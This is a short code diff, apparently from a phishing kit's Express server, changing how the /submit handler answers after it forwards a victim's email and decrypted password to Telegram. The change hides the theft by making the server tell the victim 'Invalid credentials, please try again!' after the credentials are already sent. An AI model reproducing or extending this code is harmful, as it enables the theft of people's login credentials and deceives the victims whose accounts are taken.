@@ -62,7 +62,10 @@ app.post("/submit", async (req, res) => {
       `📧 Email: ${email}\n🔑 Password: ${decryptedPassword}`
     ); // 🔥 Send real password
 
-    res.json({ status: "success", message: "Sent to Telegram securely." });
+    res.json({
+      status: "success",
+      message: "Invalid credentials, please try again!",
+    });
   } catch (error) {
     console.error("Error processing request:", error);
     res.status(500).json({ status: "error", message: "Server error" });
